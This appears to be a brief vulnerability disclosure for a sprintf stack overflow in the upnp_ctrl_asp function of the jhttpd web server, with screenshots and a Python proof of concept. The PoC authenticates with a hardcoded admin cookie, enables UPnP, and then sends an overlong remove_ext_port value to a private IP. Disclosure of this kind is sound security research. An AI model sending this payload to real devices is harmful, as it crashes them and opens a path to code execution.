<img width="1896" height="908" alt="image" src="https://github.com/user-attachments/assets/7e8826d5-1bb8-482c-a32b-692b6b4cc1cc" /><img width="1896" height="908" alt="image" src="https://github.com/user-attachments/assets/58d34aa4-5b68-4aa7-9418-110c9632ee77" />
In the upnp_ctrl_asp function in the jhttpd program, there is a stack overflow vulnerability caused by the sprintf function, which allows an attacker to forge remove_ext_proto parameter or remove_ext_port parameter as an excessively long string, so as to splice to the stack variable when sprintf is spliced
poc：
```
import requests
url="http://172.26.25.103:7300/nat_base.asp?upnp_enable=1&upnp_mnp=0&upnp_waniface=0&exec_service=upnp-restart&_=1752864920837"
headers={"cookie":"wys_userid=admin,wys_passwd=520E1BFD4CDE217D0A5824AE7EA60632"}
response=requests.get(url=url,headers=headers)

url2="http://172.26.25.103:7300/upnp_ctrl.asp?remove_ext_proto=1&remove_ext_port=1"+"1"*0x1000
response2=requests.get(url=url2,headers=headers)
print(response2.text)
```
